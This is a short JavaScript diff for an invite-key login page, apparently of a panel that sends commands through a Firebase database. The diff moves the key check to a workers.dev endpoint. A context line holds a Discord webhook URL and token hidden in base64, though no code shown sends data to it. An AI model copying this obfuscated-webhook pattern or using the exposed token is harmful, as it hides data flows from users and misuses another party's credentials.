@@ -5,7 +5,7 @@
     let webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NjQ3OTI4NTE1MzU2MjcxNS9ZeVFabWlMcEo5NEY4ZlNrWi1Sc01oenVzN2sxOE5xWVY0NU1YVk9XTndMZmNXazdVbnl6eDV5UlVUSE1tcTM2SGZ4NA==");
     document.getElementById("loginButton").addEventListener('click', () => {
         let inviteKey = document.getElementById("inviteKey").value;
-        fetch(`https://opbgguiserver-default-rtdb.firebaseio.com/accounts/${inviteKey}.json`)
+        fetch(`https://opbgguipost.landyvilla3-99d.workers.dev/login?inviteKey=${inviteKey}`)
             .then(response => response.json())
             .then(data => {
                 if (data && typeof data === 'string') {
@@ -17,7 +17,7 @@
                     alert("Invalid invite key");
                 }
             })
-            .catch(() => alert("Fetch failed"));
+            .catch((err) => alert("Fetch failed: " + err));
         function sendCommand(user, command, message) {
             const url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json"
             let plrTable = {}
